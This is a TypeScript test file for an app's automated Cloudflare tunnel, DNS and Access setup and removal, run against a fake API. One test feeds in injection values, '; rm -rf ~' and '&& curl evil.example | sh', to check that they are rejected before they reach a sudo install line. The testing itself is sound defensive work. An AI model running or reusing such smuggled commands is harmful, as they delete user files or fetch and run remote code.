/**
 * "Set it up for me" against a fake Cloudflare API (`__fixtures__/fake-cloudflare.ts`):
 * the happy path, a second run that reuses every object, a failure partway
 * and the Remove that undoes only what buddi made, and a token without a
 * permission, named in the sentence.
 */
import { afterEach, describe, expect, it } from 'vitest';
import { FAKE_TEAM, FAKE_TOKEN, fakeCloudflare, type FakeCloudflare } from '../../__fixtures__/fake-cloudflare.js';
import { createCloudflareApi } from './cloudflare-api.js';
import { toCloudflareSetting, type CloudflareAccessSetting } from './cloudflare.js';
import {
  claimSetupOperation,
  DNS_COMMENT,
  installFor,
  removeCloudflareSetup,
  runCloudflareSetup,
  type SetupDeps,
  type SetupProgress,
  type SetupRecord,
} from './cloudflare-setup.js';

const fakes: FakeCloudflare[] = [];
afterEach(async () => { await Promise.all(fakes.splice(0).map((f) => f.close())); });

const HOST = 'buddi.example.com';
const EMAIL = 'sam@example.com';

async function world(opts: Parameters<typeof fakeCloudflare>[0] = {}) {
  const cf = await fakeCloudflare(opts);
  fakes.push(cf);
  let setting: CloudflareAccessSetting = toCloudflareSetting(null);
  let record: SetupRecord | null = null;
  const tested: string[] = [];
  const seen: SetupProgress[] = [];
  const deps = (token = FAKE_TOKEN): SetupDeps => ({
    api: createCloudflareApi({ token, baseUrl: cf.baseUrl }),
    ingressPort: 4319,
    platform: 'darwin',
    readSetting: async () => setting,
    saveSetting: async (v) => { setting = v; },
    readRecord: async () => record,
    saveRecord: async (r) => { record = r; },
    test: async (team) => { tested.push(team); return { ok: true, keys: 2 }; },
    sleep: async () => {},
    pollMs: 1,
    waitMs: 60_000,
  });
  return { cf, deps, tested, seen, get setting() { return setting; }, get record() { return record; } };
}

describe('Set it up for me', () => {
  it('makes the tunnel, route, DNS, policy and application, fills in the setting, waits and tests', async () => {
    const w = await world();
    w.cf.healthyAfter = 2;
    const done = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps(), (p) => w.seen.push(p));
    expect(done.state).toBe('done');
    expect(done.steps.every((s) => s.state === 'done')).toBe(true);
    expect(done.url).toBe(`https://${HOST}`);

    const [tunnel] = w.cf.state.tunnels;
    expect(tunnel?.name).toBe(`buddi-${HOST}`);
    expect(tunnel?.config).toEqual({ ingress: [{ hostname: HOST, service: 'http://127.0.0.1:4319' }, { service: 'http_status:404' }] });
    expect(w.cf.state.dns).toEqual([expect.objectContaining({ type: 'CNAME', name: HOST, content: `${tunnel!.id}.cfargotunnel.com`, proxied: true, comment: DNS_COMMENT })]);
    expect(w.cf.state.policies).toEqual([expect.objectContaining({ decision: 'allow', include: [{ email: { email: EMAIL } }] })]);
    const [app] = w.cf.state.apps;
    expect(app).toEqual(expect.objectContaining({ domain: HOST, type: 'self_hosted', policies: [{ id: w.cf.state.policies[0]!.id, precedence: 1 }] }));

    expect(w.setting).toEqual({ enabled: true, teamDomain: FAKE_TEAM, aud: app!.aud, email: EMAIL, publicOrigin: `https://${HOST}` });
    expect(w.record).toEqual(expect.objectContaining({ host: HOST, tunnelId: tunnel!.id, aud: app!.aud, teamDomain: FAKE_TEAM }));
    expect(w.tested).toEqual([FAKE_TEAM]);

    // The install line was shown while it waited, with the connector token, never run.
    const waiting = w.seen.find((p) => p.state === 'waiting');
    expect(waiting?.install?.command).toBe(`sudo cloudflared service install eyJ-connector-token-for-${tunnel!.id}`);
    expect(waiting?.install?.note).toContain('/opt/homebrew/bin/cloudflared');
    expect(w.seen.some((p) => p.steps.find((s) => s.id === 'healthy')?.state === 'now')).toBe(true);
    // Nothing in the progress ever holds the API token.
    expect(JSON.stringify(w.seen)).not.toContain(FAKE_TOKEN);
  });

  it('reuses every object on a second run', async () => {
    const w = await world();
    await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    const before = structuredClone(w.cf.state);
    const again = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    expect(again.state).toBe('done');
    expect(w.cf.state.tunnels.map((t) => t.id)).toEqual(before.tunnels.map((t) => t.id));
    expect(w.cf.state.dns.map((r) => r.id)).toEqual(before.dns.map((r) => r.id));
    expect(w.cf.state.policies.map((p) => p.id)).toEqual(before.policies.map((p) => p.id));
    expect(w.cf.state.apps.map((a) => [a.id, a.aud])).toEqual(before.apps.map((a) => [a.id, a.aud]));
    expect(again.steps.find((s) => s.id === 'tunnel')?.text).toContain('found');
    expect(again.steps.find((s) => s.id === 'dns')?.text).toContain('found');
  });

  it('stops at a failure, and Remove undoes only what buddi made', async () => {
    const w = await world();
    // Someone else's record on another name in the zone, and their own app.
    w.cf.state.dns.push({ id: 'theirs', type: 'A', name: 'www.example.com', content: '192.0.2.1', comment: null, proxied: true });
    w.cf.state.apps.push({ id: 'their-app', name: 'Grafana', domain: 'grafana.example.com', aud: 'a'.repeat(32), type: 'self_hosted', policies: [] });
    w.cf.failNext('POST', /\/access\/apps$/, 500);
    const failed = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    expect(failed.state).toBe('failed');
    const step = failed.steps.find((s) => s.id === 'access');
    expect(step?.state).toBe('failed');
    expect(step?.why).toMatch(/Cloudflare had a problem/);
    expect(failed.steps.find((s) => s.id === 'save')?.state).toBe('next');
    expect(w.setting.enabled).toBe(false);
    expect(w.cf.state.tunnels.filter((t) => !t.deleted_at)).toHaveLength(1);
    expect(w.cf.state.policies).toHaveLength(1);

    const removed = await removeCloudflareSetup(w.deps());
    expect(removed.state).toBe('removed');
    expect(removed.error).toBeNull();
    expect(removed.removed).toEqual(['its policy', 'the DNS record', 'the tunnel']);
    expect(removed.uninstall).toBe('sudo cloudflared service uninstall');
    expect(w.cf.state.tunnels.filter((t) => !t.deleted_at)).toHaveLength(0);
    expect(w.cf.state.policies).toHaveLength(0);
    expect(w.cf.state.dns.map((r) => r.id)).toEqual(['theirs']);
    expect(w.cf.state.apps.map((a) => a.id)).toEqual(['their-app']);
    expect(w.record).toBeNull();
  });

  it('Remove after a finished setup turns the setting off', async () => {
    const w = await world();
    await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    const removed = await removeCloudflareSetup(w.deps());
    expect(removed.removed).toEqual(['the Access application', 'its policy', 'the DNS record', 'the tunnel']);
    expect(w.setting.enabled).toBe(false);
    expect(w.setting.aud).toBe('');
  });

  it('names the permission a token is missing', async () => {
    const w = await world();
    w.cf.deny.add('access');
    const failed = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    const step = failed.steps.find((s) => s.state === 'failed');
    expect(step?.id).toBe('access');
    expect(step?.why).toBe('The token can’t list Access policies. Add Account · Access: Apps and Policies · Edit to it in Cloudflare (My Profile → API Tokens → Edit), then try again.');

    const w2 = await world();
    w2.cf.deny.add('dns');
    const noDns = await runCloudflareSetup({ host: HOST, email: EMAIL }, w2.deps());
    expect(noDns.steps[0]?.why).toContain('Zone · DNS · Edit');

    const w3 = await world();
    w3.cf.deny.add('organization');
    const noOrg = await runCloudflareSetup({ host: HOST, email: EMAIL }, w3.deps());
    expect(noOrg.steps[0]?.why).toContain('Access: Organizations, Identity Providers, and Groups · Read');
  });

  it('says so for a token Cloudflare refuses, a host on no zone, and a name taken in DNS', async () => {
    const w = await world();
    const bad = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps('not-the-token-at-all-000000'));
    expect(bad.error).toContain('doesn’t accept this API token');

    const elsewhere = await runCloudflareSetup({ host: 'buddi.other.org', email: EMAIL }, w.deps());
    expect(elsewhere.error).toBe('None of the domains this token can edit holds buddi.other.org. It can edit example.com.');

    w.cf.state.dns.push({ id: 'theirs', type: 'A', name: HOST, content: '192.0.2.7', comment: null, proxied: false });
    const taken = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    expect(taken.steps.find((s) => s.id === 'dns')?.why).toContain('already has a DNS record (A to 192.0.2.7)');
  });

  it('asks for Zero Trust to be set up when the account has no team', async () => {
    const w = await world({ team: null });
    const failed = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    expect(failed.error).toContain('Zero Trust isn’t set up');
  });

  it('stops waiting when asked, keeping what it made', async () => {
    const w = await world();
    w.cf.healthyAfter = 1_000;
    const abort = new AbortController();
    const stopped = await runCloudflareSetup({ host: HOST, email: EMAIL }, { ...w.deps(), sleep: async () => { abort.abort(); }, signal: abort.signal });
    expect(stopped.state).toBe('stopped');
    expect(stopped.install?.command).toContain('service install');
    expect(w.setting.enabled).toBe(true);
  });

  it('gives the install line per platform', () => {
    const T = 'eyJhIjoiYWNjIiwidCI6InR1biJ9_-+/=';
    expect(installFor(T, 'linux').command).toBe(`sudo cloudflared service install ${T}`);
    expect(installFor(T, 'linux').note).toContain('.deb');
    expect(installFor(T, 'win32').command).toBe(`cloudflared.exe service install ${T}`);
  });

  it('never puts anything but a connector token into the sudo line', async () => {
    expect(() => installFor('eyJ-token-0123456789abcdef; rm -rf ~', 'linux')).toThrow('Cloudflare answered without the tunnel’s connector token.');
    expect(() => installFor('short', 'darwin')).toThrow('Cloudflare answered without the tunnel’s connector token.');
    const w = await world();
    w.cf.connectorToken = 'eyJ-connector-token-0000 && curl evil.example | sh';
    const failed = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps(), (p) => w.seen.push(p));
    expect(failed.state).toBe('failed');
    expect(failed.install).toBeNull();
    expect(failed.steps.find((s) => s.id === 'connector')).toMatchObject({ state: 'failed', why: 'Cloudflare answered without the tunnel’s connector token.' });
    expect(JSON.stringify(w.seen)).not.toContain('curl evil');
  });
});

describe('what buddi did not make', () => {
  it('stops at a tunnel of its name it did not make, and takes it only when told to use it anyway', async () => {
    const w = await world();
    w.cf.state.tunnels.push({ id: 'their-tunnel', name: `buddi-${HOST}`, status: 'inactive', deleted_at: null, config: { ingress: [{ service: 'http://127.0.0.1:9999' }] } });
    const stopped = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    expect(stopped.state).toBe('failed');
    expect(stopped.adoptable).toBe(true);
    expect(stopped.steps.find((s) => s.id === 'tunnel')).toMatchObject({ state: 'failed' });
    expect(stopped.error).toContain(`There is already a tunnel named buddi-${HOST}`);
    expect(stopped.error).toContain('Use it anyway');
    // Its routes were not touched, and nothing else was made.
    expect(w.cf.state.tunnels[0]?.config).toEqual({ ingress: [{ service: 'http://127.0.0.1:9999' }] });
    expect(w.cf.state.dns).toHaveLength(0);
    expect(w.record?.tunnelId).toBeUndefined();

    const adopted = await runCloudflareSetup({ host: HOST, email: EMAIL, adopt: true }, w.deps());
    expect(adopted.state).toBe('done');
    expect(adopted.adoptable).toBe(false);
    expect(w.record).toMatchObject({ tunnelId: 'their-tunnel', dnsRecordId: w.cf.state.dns[0]!.id, policyId: w.cf.state.policies[0]!.id, appId: w.cf.state.apps[0]!.id });
  });

  it('stops at an Access policy of its name it did not make', async () => {
    const w = await world();
    w.cf.state.policies.push({ id: 'their-policy', name: `buddi — ${HOST}`, decision: 'allow', include: [{ email: { email: 'someone@example.com' } }] });
    const stopped = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    expect(stopped.adoptable).toBe(true);
    expect(stopped.steps.find((s) => s.id === 'access')?.state).toBe('failed');
    expect(w.cf.state.policies[0]?.include).toEqual([{ email: { email: 'someone@example.com' } }]);
  });

  it('removes only the ids its record holds, never by name', async () => {
    const w = await world();
    await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    // Someone else's objects with buddi's names (an old install, a lost record).
    w.cf.state.policies.push({ id: 'their-policy', name: `buddi — ${HOST}`, decision: 'allow', include: [] });
    w.cf.state.tunnels.push({ id: 'their-tunnel', name: `buddi-${HOST}`, status: 'inactive', deleted_at: null });
    const removed = await removeCloudflareSetup(w.deps());
    expect(removed.error).toBeNull();
    expect(w.cf.state.policies.map((p) => p.id)).toEqual(['their-policy']);
    expect(w.cf.state.tunnels.filter((t) => !t.deleted_at).map((t) => t.id)).toEqual(['their-tunnel']);
    expect(w.record).toBeNull();

    // With no record at all, nothing is removed, whatever carries buddi's name.
    const nothing = await removeCloudflareSetup({ ...w.deps(), host: HOST });
    expect(nothing.removed).toEqual([]);
    expect(nothing.error).toContain('no record');
    expect(w.cf.state.policies.map((p) => p.id)).toEqual(['their-policy']);
  });

  it('forgets each id as its object goes, so Remove again retries only what is left', async () => {
    const w = await world();
    await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
    w.cf.failNext('DELETE', /\/dns_records\//, 500);
    const partly = await removeCloudflareSetup(w.deps());
    expect(partly.error).toContain('the DNS record');
    expect(w.record).toMatchObject({ appId: undefined, policyId: undefined, tunnelId: undefined });
    expect(w.record?.dnsRecordId).toEqual(expect.any(String));
    const again = await removeCloudflareSetup(w.deps());
    expect(again.removed).toEqual(['the DNS record']);
    expect(w.record).toBeNull();
  });
});

describe('one operation at a time', () => {
  it('refuses a setup or a removal while another holds the lock, touching nothing', async () => {
    const w = await world();
    const lease = claimSetupOperation('remove')!;
    try {
      const setup = await runCloudflareSetup({ host: HOST, email: EMAIL }, w.deps());
      expect(setup).toMatchObject({ state: 'failed', error: 'buddi is removing what it made in Cloudflare. Wait for it to finish, then try again.' });
      const removal = await removeCloudflareSetup(w.deps());
      expect(removal.state).toBe('failed');
      expect(w.cf.calls).toEqual([]);
    } finally {
      lease.release();
    }
    const free = claimSetupOperation('setup');
    expect(free).not.toBeNull();
    free?.release();
  });
});
